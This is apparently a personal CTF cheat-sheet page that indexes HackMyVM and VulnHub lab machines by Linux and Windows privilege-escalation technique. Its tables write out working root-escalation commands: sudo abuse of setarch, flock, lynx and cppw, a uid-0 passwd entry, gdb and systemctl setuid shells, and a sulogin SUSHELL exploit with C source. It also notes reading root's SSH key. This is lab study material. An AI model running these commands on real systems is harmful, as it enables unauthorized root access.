---
title: PrivEsc
icon: fas fa-info-circle
order: 4
---

The below is a modification from [here](https://github.com/Ignitetechnologies/Privilege-Escalation) !

<a name="table-of-contents"></a>

Table of Contents LINUX
==========================

* [Abusing Sudo Rights](#sudo)
* [SUID Bit](#suid)
* [Writable /etc/passwd file](#etc)
* [Python Pickle](#pickle)
* [Path Variable](#path)
* [Docker Escape](#docker)
* [Writable files or script](#wfos)
* [Environment Variable](#ev)


Table of Contents WINDOWS
==========================

* [Service](#Service)

<a name="sudo"></a>
##  Abusing Sudo Rights [⤴](#table-of-contents)

|No.|Machine Name|Reference|Files/Binaries| Description |
|-------|--------------|--------------|----------------|----------------|
|1.|[PYEXP: 1](https://www.vulnhub.com/entry/pyexp-1,534/)|[Reference](https://am-a-circle.github.io/posts/PYEXP_1/)| Python script| exec function |
|2.|[BaseME](https://hackmyvm.eu/machines/machine.php?vm=BaseME)|[Reference](https://am-a-circle.github.io/posts/BaseME/)| base64| base64 to read id_rsa from /root/.ssh/id_rsa |
|3.|[five](https://hackmyvm.eu/machines/machine.php?vm=five)|[Reference](https://am-a-circle.github.io/posts/five/)| man | man command using Pager of less function. |
|4.|[forbidden](https://hackmyvm.eu/machines/machine.php?vm=Forbidden)| [EXTERNAL Reference](https://d4t4s3c.medium.com/hackmyvm-forbidden-4266900e6c94) | setarch |  sudo setarch x86_64 /bin/sh |
|5.|[Vulny](https://hackmyvm.eu/machines/machine.php?vm=Vulny)| [EXTERNAL Reference](https://kerszl.github.io/hacking/walkthrough/vulny/) | flock |   sudo flock -u / /bin/sh |
|6.|[troya](https://hackmyvm.eu/machines/machine.php?vm=troya)|[Reference](https://am-a-circle.github.io/posts/troya/)| insmod | [Insert kernel as root for reverse shell](https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities#example-2-with-binary)  |
|7.|[Echoed](https://hackmyvm.eu/machines/machine.php?vm=Echoed)|No Reference| xdg-open| 1. echo "HackMyVM.eu" > HackMyVM <br> 2. sudo -u root /usr/bin/xdg-open /tmp/HackMyVM <br> 3. Escape shell with after it comes out  e.g. <br>WARNING: terminal is not fully functional <br>/tmp/HackMyVM  (press RETURN)!/bin/sh |
|8.|[Attack](https://hackmyvm.eu/machines/machine.php?vm=Attack)|No Reference| /usr/sbin/cppw| openssl passwd -1 pass123 <br> `$1$GLppQ1Z2$VsR0VveK9V3l0Ata6WLCr1` <br> kratos@attack:/home/kratos$ cp /etc/passwd . <br> kratos@attack:/home/kratos$ mv passwd passwd_backup <br> kratos@attack:/home/kratos$ echo `"user3:$1$GLppQ1Z2$VsR0VveK9V3l0Ata6WLCr1:0:0::/root:/bin/bash"` >> passwd_backup  <br> kratos@attack:/home/kratos$ sudo -u root /usr/sbin/cppw passwd_backup |
|9.|[Talk](https://hackmyvm.eu/machines/machine.php?vm=Talk)| Reference| lynx |sudu -u root /usr/bin/lynx <br> press `shift + 1`  <br> Spawning your default shell.  Use 'exit' to return to Lynx. <br> root@talk:/home/nona# whoami;id <br> root|
 
<a name="suid"></a>
##  SUID Bit [⤴](#table-of-contents)

|No.| Machine Name                 |SUID Bit| Reference | Method |
|-------|------------------------------|-------|-------|--------------------------------------------------------|
|1|[ShellDredd #1 Hannah](https://www.vulnhub.com/entry/onsystem-shelldredd-1-hannah,545/)| cpulimit|[Reference](https://am-a-circle.github.io/posts/ONSYSTEM-HANNAH/)  | cpulimit -l 50 -f cp /bin/bash /tmp/bash <br> cpulimit -l 50 -f chmod +s /tmp/bash <br>  /tmp/bash -p|
|2|[hackmyvm : connection](https://hackmyvm.eu/machines/machine.php?vm=Connection)| gdb |[Reference](https://am-a-circle.github.io/posts/connection/)  | gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit |a
|3|[hackmyvm : soul](https://hackmyvm.eu/machines/machine.php?vm=soul)| agetty |Reference |/sbin/agetty -o -p -l /bin/bash -a root tty|
|4|[hackmyvm :Dominator](https://hackmyvm.eu/machines/machine.php?vm=Dominator)| systemctl |Reference | hans@Dominator:$ nano /tmp/temp.service <br> hans@Dominator:$ cat /tmp/temp.service <br> [Service] <br> Type=oneshot <br> ExecStart=/bin/sh -c "cp /bin/bash /tmp/bash2 && chmod u+s /tmp/bash2" <br> [Install] <br> WantedBy=multi-user.target <br> hans@Dominator:$ /usr/bin/systemctl link /tmp/temp.service  <br> hans@Dominator:$ /usr/bin/systemctl enable --now /tmp/temp.service <br> hans@Dominator:~$ /tmp/bash2 -p <br> bash2-5.0# whoami <br> root |
|5|[Locker](https://hackmyvm.eu/machines/machine.php?vm=Locker)| sulogin | Reference  | Environment Variables <br> sulogin looks for the environment variable SUSHELL or sushell to determine what shell to start. If the environment variable is not set, it will try to execute root's shell from /etc/passwd. If that fails it will fall back to /bin/sh. <br>  <br> ┌──(root💀kali)-[/opt/hackmyv/locker] <br> └─# cat exp.c   <br> int main() { <br> setuid(0); <br> setgid(0); <br> system("/bin/bash -p"); <br> } <br>  <br> www-data@locker:/tmp$ export SUSHELL=/tmp/exp <br> export SUSHELL=/tmp/exp <br>  <br> www-data@locker:/tmp$ chmod 777 exp <br> chmod 777 exp <br> www-data@locker:/tmp$ /usr/sbin/sulogin -e <br> /usr/sbin/sulogin -e <br> Press Enter for maintenance <br> (or press Control-D to continue): <br>  <br> root@locker:~# whoami;id <br> whoami;id <br> root <br> uid=0(root) gid=0(root) groups=0(root),33(www-data) <br> |



<a name="etc"></a>
##  Writable /etc/passwd file [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [PYLINGTON1](https://am-a-circle.github.io/posts/PYLINGTON_1/)|

<a name="wfos"></a>
##  Writable file or script [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [suidy](https://am-a-circle.github.io/posts/suidy/)|

<a name="pickle"></a>
##  Python Pickle [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [PHINEAS:1](https://am-a-circle.github.io/posts/PHINEAS_1/)|

<a name="path"></a>
##  Path Variable [⤴](#table-of-contents)

|No.| Machine Name   | comments  |
|-------|-----------------|--------|
|1.| [Hacksudo:search](https://am-a-circle.github.io/posts/Hacksudo_Search/)|install: missing file operand    |
|2.| [hommie](https://am-a-circle.github.io/posts/Hommie/)|cat: not absolute file path   |

<a name="docker"></a>
##  Docker Escape [⤴](#table-of-contents)

| No | Machine Name|
|----|-----------|
|1.	 | [pwned](https://am-a-circle.github.io/posts/pwned/)|

<a name="ev"></a>

##  Enviroment variable [⤴](#table-of-contents)

|No.| Machine Name   | comments  |
|-------|-----------------|--------|
|1. | [icarus](https://am-a-circle.github.io/posts/icarus/)| LD_PRELOAD |


<a name="Service"></a>

##  Service [⤴](#table-of-contents)

|No.| Machine Name   | service exploit  |
|-------|-----------------|--------|
|1. | driver | [spoolsv](https://github.com/calebstewart/CVE-2021-1675) 



